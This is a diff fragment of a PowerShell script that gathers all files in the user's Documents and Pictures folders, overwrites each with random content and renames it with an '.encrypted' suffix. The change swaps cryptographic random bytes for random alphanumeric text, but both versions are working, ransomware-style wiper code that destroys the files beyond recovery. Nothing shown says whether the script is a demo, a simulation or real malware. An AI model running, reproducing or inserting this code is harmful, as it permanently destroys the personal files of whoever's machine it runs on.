@@ -62,14 +62,14 @@ $picturesPath = [Environment]::GetFolderPath("MyPictures")
 $documents = Get-ChildItem $documentsPath -File *
 $pictures = Get-ChildItem $picturesPath -File *
 $files = $documents + $pictures
-[System.Security.Cryptography.RNGCryptoServiceProvider] $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+
+$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray()
     
 foreach ($file in $files) {
     $filepath = $file.FullName
     $filename = $file.Name
-    $filelength = $file.Length
-    $rndbytes = New-Object byte[] $filelength
-    $rng.GetBytes($rndbytes)
-    Set-Content -Path $filepath -Encoding Byte -Value $rndbytes
+    $length = Get-Random -max 10000
+    $content = -join ((1..$length) | ForEach-Object { $characters | Get-Random })
+    Set-Content -Path $filepath -Value $content
     Rename-Item -Path $filepath -NewName "$filename.encrypted"
 }
